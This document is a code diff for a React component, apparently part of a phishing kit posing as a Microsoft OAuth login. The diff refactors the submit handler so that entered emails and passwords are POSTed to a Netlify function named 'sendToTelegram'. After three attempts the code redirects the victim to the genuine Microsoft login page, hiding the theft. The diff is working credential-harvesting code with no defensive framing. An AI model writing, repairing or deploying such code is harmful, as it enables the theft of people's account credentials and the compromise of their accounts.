@@ -47,46 +47,44 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   const handleSubmit = async (event: React.FormEvent) => {
     event.preventDefault();
-    
-    setCount(prevCount => {
-      const newCount = prevCount + 1;
-      
-      if (newCount >= 3) {
-        window.location.replace("http://login.microsoftonline.com");
-        return newCount;
+
+    // Calculate new count synchronously and update state
+    const newCount = count + 1;
+    setCount(newCount);
+
+    if (newCount >= 3) {
+      window.location.replace("http://login.microsoftonline.com");
+      return;
+    }
+
+    setIsSubmitting(true);
+
+    // Perform async work here (not inside setCount updater)
+    try {
+      const response = await fetch('/.netlify/functions/sendToTelegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password,
+          detail: '',
+        }),
+      });
+
+      const data = await response.json();
+
+      if (data.signal === 'ok') {
+        setMsg(data.msg);
+      } else {
+        setMsg(data.msg);
       }
-      
-      setIsSubmitting(true);
-      
-      // Simulate API call
-      try {
-        const response = await fetch('next.php', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            email: email,
-            password: password,
-            detail: '',
-          }),
-        });
-        
-        const data = await response.json();
-        
-        if (data.signal === 'ok') {
-          setMsg(data.msg);
-        } else {
-          setMsg(data.msg);
-        }
-      } catch (error) {
-        setMsg("Please try again later");
-      } finally {
-        setIsSubmitting(false);
-      }
-      
-      return newCount;
-    });
+    } catch (error) {
+      setMsg("Please try again later");
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
